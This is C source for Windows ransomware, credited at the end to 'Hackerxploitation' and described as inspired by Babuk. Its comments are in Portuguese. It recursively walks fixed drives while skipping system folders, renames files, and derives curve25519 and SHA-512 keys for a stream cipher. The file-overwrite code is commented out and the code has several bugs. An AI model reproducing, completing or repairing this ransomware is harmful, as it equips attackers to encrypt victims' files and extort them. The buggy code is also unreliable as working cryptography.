#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <dirent.h>
#include "curve25519-donna.h"
#include <bcrypt.h>
#include <ntsecapi.h>
#include "sha512.h"
#include <locale.h>
#include "ecrypt-sync.h"
#include <bcrypt.h>
#include <Shlwapi.h>


char * extract_file_name(WCHAR path[1024])
{
    int len = strlen(path);
    int flag=0;
    printf("\nlength of %s : %d",path, len);


    for(int i=len-1; i>0; i--)
    {
        if(path[i]=='\\' || path[i]=='//' || path[i]=='/' )
        {
            flag=1;
            path = path+i+1;
            break;
        }
    }


    return path;
}








//funçao de derivaçao de chave use na criptografia simetrica
int m_publ[32] = {
        8,  8,  6,  4,  4,  4,  4,  4,  5,  0,
        'n',  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00
};



void FwriteKey(char *path){}//iscrece a chave publica

const  char C[ 32 ] = { 9 };//Bse
 //nao use a mesma  chave para cada amostra e vitima//queremos ter  2^256 chaves possivesi
void cipherxor(BYTE *buffer,int len,BYTE *key){
int    j=0;

 for(int i = 0; i <= len; i++){

buffer[i]=buffer[i]^=key[i];

    }

//segredo compartilhado
}//usaremos o segredo co
BYTE* generatPrivateKey(BYTE *key){
    HCRYPTPROV  hCryptProv;
 memset (key, 0, 32);


 if( RtlGenRandom(key,32)==FALSE){
    printf("erro");
}


return(key);


}
void remove_extension(char* s) {
  char* dot = 0;
  while (*s) {
    if (*s == '.') dot = s;  // last dot
    else if (*s == '/' || *s == '\\') dot = 0;  // ignore dots before path separators
    s++;
  }
  if (dot) *dot = '\0';
}

VOID Encrypt_File(char    *name){
name[MAX_PATH]='\0';
char out[MAX_PATH];
out[MAX_PATH]='\0';
strcpy(out,name);

//printf("%s",out);
char *ext=".a";

PathRemoveExtensionA(out);
//printf("%s\n",out);
strcat(out,ext);
//printf("%s\n",out);
char outp[MAX_PATH];
outp[MAX_PATH]='\0';
strcpy(outp,out);
//printf("%s",outp);
//strcat(inp,ext);
//printf("%s",inp);

rename(name,outp);
HCRYPTPROV  hCryptProv;
BYTE pbDataSecrete[ 32];
BYTE pbDataPublic[ 32];
BYTE pbShare[ 32];
BYTE pbShareDest[ 32];
generatPrivateKey(&pbDataSecrete);

pbDataSecrete[0] &= 248;
                    pbDataSecrete[31] &= 127;
                    pbDataSecrete[31] |= 64;
                    curve25519_donna(&pbDataPublic,   &pbDataSecrete[ 32], &C);
                    curve25519_donna(&pbShare,   &pbDataSecrete[ 32], &m_publ);
                   //SHA512Hash((uint8_t)&pbShare,32);
                   memset(&pbDataSecrete,0,32);//zeremos a chave privada
BYTE k[32];
BYTE *nonce="100116649696923968170152204148972049320091145701181271883417257213772402812516828";
sha512(pbShare,32,k);
for(int i=0;i<32;i++){

    printf("%d",k);
}
  ECRYPT_ctx ctx;
   ECRYPT_init();       //zfaÃ§a o hash
ECRYPT_keysetup(&ctx, k, 256, 256);
 ECRYPT_ivsetup(&ctx, nonce);

/*FILE *fin = fopen(outp, "rb");//abrimos o arquivo
    fseek(fin, 0, SEEK_END);//
    long len = ftell(fin);
    rewind(fin);//reposiciona o ponteiro  para o iicio
    BYTE *buffer =(BYTE*) malloc(len);
    //aloca



    fread(buffer, len, 1, fin);//Ler o conteudo do arquivo
ECRYPT_encrypt_bytes(&ctx,buffer,buffer,len);
memset((BYTE*)&ctx,0,sizeof (ECRYPT_ctx));

memset(k,0,32);
memset(pbShare,0,32);
memset(pbDataSecrete,0,32);
//   cipherxor(buffer,len,shared_secrete);


//strcat(newName,ext);





     FILE *fout = fopen(outp, "wb");//Substituimos o arquivo e iscrevemos os dados criptogrados
    fwrite(buffer, len, 1, fout);
    //fprintf(fout,".f");
    fclose(fout);
free(buffer);

    /*CHAR newname[MAX_PATH];
	strcpy(newname,name);
	strcat(newname,".LockerKey");
	MoveFile(name,newname);*////Renomeamos e mudamos a extensao dos nosso arquivos*/






}









/* This is the function used to scan drives for files */



void files_tree(const char *folder) {

    char wildcard[MAX_PATH];
    sprintf(wildcard, "%s\\*", folder);
    printf("%s",folder);
    WIN32_FIND_DATA fd;
    HANDLE handle = FindFirstFile(wildcard, &fd);

    if(handle == INVALID_HANDLE_VALUE) return;

    do {

        if(strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
        	continue;

	char path[MAX_PATH];
        sprintf(path, "%s\\%s", folder, fd.cFileName);

        if((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(fd.dwFileAttributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DEVICE))){
            files_tree(path);


		//printf(path);
        }
		if (fd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE){
			//printf(path);
			puts(path);
			Encrypt_File(path);
			//puts(path);
		}
    } while(FindNextFile(handle, &fd));

    FindClose(handle);
}

void files_tree_pastas(const char *folder) {

    char wildcard[MAX_PATH];
    sprintf(wildcard, "%s\\*", folder);
    printf("%s",folder);
    WIN32_FIND_DATA fd;
    HANDLE handle = FindFirstFile(wildcard, &fd);

    if(handle == INVALID_HANDLE_VALUE) return;

    do {

        if(strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0 || strcmp(fd.cFileName,"Program Files")==0 || strcmp(fd.cFileName,"AppData")==0 || strcmp(fd.cFileName,"Program Files (x86)")==0 || strcmp(fd.cFileName,"Boot")==0 || strcmp(fd.cFileName,"Program Files")==0 || strcmp(fd.cFileName,"bootmgr")==0 || strcmp(fd.cFileName,"ProgramData")==0  ||  strcmp(fd.cFileName,"ProgramData")==0  || strcmp(fd.cFileName,"All Users")==0)
        	continue;

	char path[MAX_PATH];
        sprintf(path, "%s\\%s", folder, fd.cFileName);

        if((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(fd.dwFileAttributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DEVICE))){
           //puts(path);
            files_tree_pastas(path);

            printf(path);


		//printf(path);
        }

    } while(FindNextFile(handle, &fd));

    FindClose(handle);
}


VOID Drives_Encrytp(){
DWORD mydrives = 10240;
char drives[3];
drives[3]='\0';
	char lpBuffer[10240];
	DWORD test;
	int i;
	test = GetLogicalDriveStringsA(mydrives, (LPSTR)lpBuffer);

	if (test != 0)
	{

		int idx = 0;
		while ( lpBuffer[idx] != NULL )
		{
			char * driveStringBuf = &lpBuffer[idx];

			switch (GetDriveTypeA(driveStringBuf))
			{
			case DRIVE_UNKNOWN:

				break;
			case DRIVE_NO_ROOT_DIR:

				break;
			case DRIVE_REMOVABLE:

				break;
			case DRIVE_FIXED:



				files_tree_pastas(driveStringBuf);
				break;
			case DRIVE_REMOTE:

				break;
			case DRIVE_CDROM:

				break;
			case DRIVE_RAMDISK:

				break;
			}
			idx += lstrlen(driveStringBuf) + 1;
		}
		printf("\n");
	}
	else
	{

	}
}
































int main(){
LPVOID d;
files_tree_pastas("C:\\");
}

















//Autor Hackerxploitation  ispirado nobabuuk ransoware
